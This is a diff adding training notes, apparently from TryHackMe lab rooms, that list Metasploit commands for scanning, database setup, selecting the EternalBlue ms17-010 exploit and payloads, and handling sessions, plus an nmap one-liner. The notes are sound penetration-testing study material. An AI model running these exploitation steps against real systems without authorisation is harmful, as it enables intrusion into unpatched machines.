@@ -696,5 +696,50 @@ Vulnerability types:
 - ``` msf6 > search ms17-010 ``` searches using CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system.  ``` use 0 ``` use the listed number.
 - ``` msf6 > search type:auxiliary telnet ``` search results to only include auxiliary module.
 - ``` msf5 exploit(windows/smb/ms17_010_eternalblue) > unset all ```
-- 
 
+**Metasploit: Exploitation**
+TCP scan
+- ``` msf6 > search portscan ```
+- ``` msf6 auxiliary(scanner/portscan/tcp) > show options ```
+
+UDP
+- ``` msf6 auxiliary(scanner/discovery/udp_sweep) > run ```
+
+SMB Scans
+- ``` msf6 auxiliary(scanner/smb/smb_version) > run ```
+
+**Metasploit Database**
+- ``` systemctl start postgresql ```
+- ``` msfdb init ```
+- ``` msf6 > db_status ```
+- ``` msf6 > workspace ```
+- ``` msf6 > workspace -a tryhackme ``` add; ``` -d ``` delete
+- ``` workspace -h ```
+
+db_nmap
+- ``` msf6 > db_nmap -sV -p- 10.10.12.229 ``` run nmap, result saved to the database.
+- ``` msf6 > hosts ```, ``` msf6 > services ``` show saved information.
+- ``` hosts -h ```, ``` services -h ``` 
+
+usage
+- ``` use auxiliary/scanner/smb/smb_ms17_010 ```
+- ``` hosts -R ``` add hosts value to the RHOSTS parameter
+- ``` msf6 > services -S netbios ``` search "netbios" in services
+
+low-hanging fruits
+- HTTP, FTP, SMB, SSH, RDP
+
+**Exploitation**
+- ``` msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads ``` list other commands you can use with that specific exploit.
+- ``` msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 2 ```
+- background it using ``` CTRL+Z ``` or abort it using ``` CTRL+C ```
+- ``` msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions ``` show sessions, include background.
+
+**Working with sessions**
+- ``` msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -h ``` help
+- ``` msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 1 ``` interact with session 1.
+
+example
+- ``` nmap -sC -sV -p- -T4 --min-rate=9326 -vv [MACHINE IP] ```
+
+**Msfvenom**
